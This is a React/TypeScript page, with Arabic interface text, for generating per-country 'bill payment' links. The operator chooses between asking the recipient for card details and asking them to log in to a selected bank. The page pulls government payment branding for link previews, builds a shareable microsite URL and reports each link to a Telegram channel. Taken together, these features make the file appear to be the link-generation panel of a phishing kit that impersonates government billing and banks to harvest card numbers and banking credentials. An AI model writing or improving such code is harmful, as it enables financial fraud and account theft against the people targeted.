import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useCreateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCurrencySymbol, getCurrencyName, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
import { getBanksByCountry } from "@/lib/banks";
import { getCompanyMeta } from "@/utils/companyMeta";
import { getCurrency, getDefaultTitle } from "@/utils/countryData";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { CreditCard, DollarSign, Hash, Building2, Copy, ExternalLink, FileText, Shield } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import TelegramTest from "@/components/TelegramTest";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const CreatePaymentLink = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const countryData = getCountryByCode(country?.toUpperCase() || "");

  const [paymentAmount, setPaymentAmount] = useState("500");
  const [paymentMethod, setPaymentMethod] = useState("card");
  const [selectedBank, setSelectedBank] = useState("");
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
  const [micrositeUrl, setMicrositeUrl] = useState("");
  const [linkId, setLinkId] = useState("");
  const [copied, setCopied] = useState(false);
  
  const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!paymentAmount) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال مبلغ السداد",
        variant: "destructive",
      });
      return;
    }

    try {
      const link = await createLink.mutateAsync({
        type: "payment",
        country_code: country || "",
        payload: {
          payment_amount: parseFloat(paymentAmount) || 500,
          currency_code: getCurrencyCode(country || "SA"),
          payment_method: paymentMethod,
          selected_bank: paymentMethod === "bank_login" ? selectedBank : null,
          selectedCountry: country || "SA",
          service_key: "payment",
          service_name: "سداد فاتورة",
        },
      });

      // Generate payment URL
      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: "payment",
        country: country || 'SA'
      });
      
      // Generate microsite URL for sharing
      const micrositeUrl = `${window.location.origin}/r/${country}/payment/${link.id}?service=payment`;
      
      // Get government system branding for meta tags
      const govSystem = require('@/lib/governmentPaymentSystems').getGovernmentPaymentSystem(country || 'SA');

      // Send to Telegram with payment info
      await sendToTelegram({
        type: 'payment_recipient',
        data: {
          service: "سداد فاتورة",
          amount: formatCurrency(parseFloat(paymentAmount) || 500, country || "SA"),
          country: countryData.nameAr,
          payment_method: paymentMethod === "card" ? "بطاقة ائتمان" : "تسجيل دخول بنكي",
          payment_url: micrositeUrl
        },
        timestamp: new Date().toISOString()
      });

      setCreatedPaymentUrl(paymentUrl);
      setMicrositeUrl(micrositeUrl);
      setLinkId(link.id);
      setShowSuccessDialog(true);

      toast({
        title: "تم إنشاء رابط السداد بنجاح!",
        description: "يمكنك الآن مشاركة الرابط مع العميل",
      });
    } catch (error) {
      console.error("Error creating payment link:", error);
      toast({
        title: "خطأ في إنشاء الرابط",
        description: "حدث خطأ أثناء إنشاء رابط السداد",
        variant: "destructive",
      });
    }
  };

  const handleCopyLink = () => {
    navigator.clipboard.writeText(createdPaymentUrl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast({
      title: "تم النسخ!",
      description: "تم نسخ رابط الدفع إلى الحافظة",
    });
  };
  
  const handlePreview = () => {
    window.open(createdPaymentUrl, '_blank');
  };


  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <CreditCard className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
      <div className="container mx-auto px-4">
        {/* Telegram Test Component */}
        <div className="mb-6">
          <TelegramTest />
        </div>

        <div className="max-w-2xl mx-auto">
          <Card className="p-4 shadow-elevated">
            <div
              className="h-16 -m-4 mb-4 rounded-t-xl relative"
              style={{
                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
              }}
            >
              <div className="absolute inset-0 bg-black/20 rounded-t-xl" />
              <div className="absolute bottom-2 right-4 text-white">
                <h1 className="text-lg font-bold">إنشاء رابط سداد</h1>
                <p className="text-xs opacity-90">{countryData.nameAr}</p>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">

              {/* Payment Amount */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <DollarSign className="w-3 h-3" />
                  مبلغ السداد
                  {country && (
                    <span className="text-xs text-muted-foreground">
                      ({getCurrencyName(country)})
                    </span>
                  )}
                </Label>
                <Input
                  type="number"
                  value={paymentAmount}
                  onChange={(e) => setPaymentAmount(e.target.value)}
                  placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
                  className="h-9 text-sm"
                  step="0.01"
                  min="0"
                />
                {country && (
                  <p className="text-xs text-muted-foreground mt-1">
                    💱 العملة: {getCurrencyName(country)} ({getCurrencySymbol(country)})
                  </p>
                )}
              </div>

              {/* Payment Method Selection */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <CreditCard className="w-3 h-3" />
                  طريقة الدفع *
                </Label>
                <Select value={paymentMethod} onValueChange={setPaymentMethod}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر طريقة الدفع" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    <SelectItem value="card">
                      <div className="flex items-center gap-2">
                        <CreditCard className="w-4 h-4" />
                        <span>بطاقة ائتمان - دفع بالبطاقة</span>
                      </div>
                    </SelectItem>
                    <SelectItem value="bank_login">
                      <div className="flex items-center gap-2">
                        <Building2 className="w-4 h-4" />
                        <span>تسجيل دخول البنك</span>
                      </div>
                    </SelectItem>
                  </SelectContent>
                </Select>
                <p className="text-xs text-muted-foreground mt-1">
                  {paymentMethod === "card" 
                    ? "🔒 سيُطلب من العميل إدخال بيانات البطاقة"
                    : "🏦 سيُطلب من العميل تسجيل الدخول للبنك"}
                </p>
              </div>
              
              {/* Bank Selection (Only for bank_login) */}
              {paymentMethod === "bank_login" && (
                <div>
                  <Label className="mb-2 flex items-center gap-2 text-sm">
                    <Building2 className="w-3 h-3" />
                    اختر البنك (اختياري)
                  </Label>
                  <Select value={selectedBank} onValueChange={setSelectedBank}>
                    <SelectTrigger className="h-10">
                      <SelectValue placeholder="اختر البنك أو تخطي" />
                    </SelectTrigger>
                    <SelectContent className="bg-background z-50">
                      {banks.map((bank) => (
                        <SelectItem key={bank.id} value={bank.id}>
                          <div className="flex items-center gap-2">
                            {bank.logo && (
                              <img 
                                src={bank.logo} 
                                alt={bank.nameAr}
                                className="h-5 w-5 object-contain"
                                onError={(e) => e.currentTarget.style.display = 'none'}
                              />
                            )}
                            <span>{bank.nameAr}</span>
                          </div>
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                  <p className="text-xs text-muted-foreground mt-1">
                    💡 {selectedBank 
                      ? `سيتم توجيه العميل لصفحة ${banks.find(b => b.id === selectedBank)?.nameAr}` 
                      : 'يمكن للعميل اختيار البنك لاحقاً'}
                  </p>
                </div>
              )}

              <Button
                type="submit"
                size="lg"
                className="w-full h-11 text-white mt-6"
                style={{
                  background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`
                }}
                disabled={createLink.isPending}
              >
                {createLink.isPending ? "جاري الإنشاء..." : "إنشاء رابط السداد"}
              </Button>
            </form>
          </Card>
        </div>

        {/* Success Dialog with Copy and Preview */}
        <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
          <AlertDialogContent className="max-w-md" dir="rtl">
            <AlertDialogHeader>
              <AlertDialogTitle className="text-xl text-center">
                ✅ تم إنشاء رابط السداد بنجاح!
              </AlertDialogTitle>
              <AlertDialogDescription className="text-center">
                يمكنك نسخ الرابط ومشاركته مع العميل
              </AlertDialogDescription>
            </AlertDialogHeader>
            
            <div className="my-4">
              {/* Payment Summary */}
              <div className="bg-secondary/50 p-4 rounded-lg mb-4 space-y-2">
                <div className="flex items-center justify-between text-sm">
                  <span className="text-muted-foreground">المبلغ:</span>
                  <span className="font-semibold">
                    {formatCurrency(parseFloat(paymentAmount) || 500, country || "SA")}
                  </span>
                </div>
                <div className="flex items-center justify-between text-sm">
                  <span className="text-muted-foreground">العملة:</span>
                  <span className="font-semibold">{getCurrencyName(country || "SA")}</span>
                </div>
                <div className="flex items-center justify-between text-sm">
                  <span className="text-muted-foreground">طريقة الدفع:</span>
                  <span className="font-semibold">
                    {paymentMethod === "card" ? "بطاقة ائتمان" : "تسجيل دخول البنك"}
                  </span>
                </div>
              </div>

              <div className="bg-secondary/50 p-3 rounded-lg mb-3 break-all text-xs">
                {createdPaymentUrl}
              </div>

              <div className="flex gap-2">
                <Button
                  onClick={handleCopyLink}
                  variant="outline"
                  className="flex-1"
                >
                  {copied ? (
                    <>
                      <Copy className="w-4 h-4 ml-2" />
                      تم النسخ!
                    </>
                  ) : (
                    <>
                      <Copy className="w-4 h-4 ml-2" />
                      نسخ الرابط
                    </>
                  )}
                </Button>

                <Button
                  onClick={handlePreview}
                  variant="outline"
                  className="flex-1"
                >
                  <ExternalLink className="w-4 h-4 ml-2" />
                  معاينة
                </Button>
              </div>
            </div>
          </AlertDialogContent>
        </AlertDialog>
      </div>
    </div>
  );
};

export default CreatePaymentLink;
